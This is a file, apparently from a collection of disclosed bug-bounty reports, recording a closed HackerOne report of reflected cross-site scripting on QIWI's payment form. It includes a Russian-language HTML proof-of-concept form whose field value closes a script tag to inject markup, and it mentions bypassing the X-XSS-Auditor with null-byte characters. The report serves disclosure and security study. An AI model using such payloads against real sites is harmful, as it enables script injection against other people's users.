@@ -1,0 +1,23 @@
+ReportLink:https://hackerone.com/reports/263684
+WeaknessName:Cross-site Scripting (XSS) - Reflected
+Reporter:https://hackerone.com/nstikhomirov
+ReportedTo:QIWI(qiwi)
+BountyAmount:550.0
+Severity:high
+State:Closed
+DateOfDisclosure:17.10.2017 10:10:20
+
+Summary:
+
+Высылаем POST 
+```
+<form action="https://qiwi.com/payment/form/25598" method="POST">
+	<input type="text" name="extra['account']" value="(999)999-99-99'&quot;></script><font color=RED size=+15>HACKED</font>">
+	<input type="submit">
+</form>
+```
+В чем дело? Символы ", %{BYTS} фильтруются, но не фильтруется `/` символ
+Из за этого мы можем тупо закрыть скрипт при помощи `</script>` и писать все, что угодно
+P.S. >>> Можно забайпасить X-XSS-Auditor при помощи ваших обработок %00 и тп символов :)
+
+Что в итоге выходит? F216159
